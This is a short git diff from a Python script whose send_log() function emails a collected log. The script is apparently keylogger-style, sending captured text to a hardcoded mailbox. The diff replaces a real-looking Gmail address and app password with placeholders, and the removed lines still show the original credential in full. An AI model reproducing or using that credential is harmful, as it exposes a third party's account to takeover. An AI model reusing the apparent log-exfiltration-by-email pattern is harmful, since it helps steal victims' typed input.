@@ -77,9 +77,9 @@ def send_log():
 
         msg = MIMEMultipart()
         msg['Subject'] = "Assunto"
-        msg['From'] = 'lukasandrios@gmail.com'
-        msg['To'] = 'lukasandrios@gmail.com'
-        password = 'kncunnscgoqjxauz'
+        msg['From'] = 'me@gmail.com'
+        msg['To'] = 'me@gmail.com'
+        password = 'password'
 
         msg.attach(MIMEText(fullog_replaced, 'plain'))
 
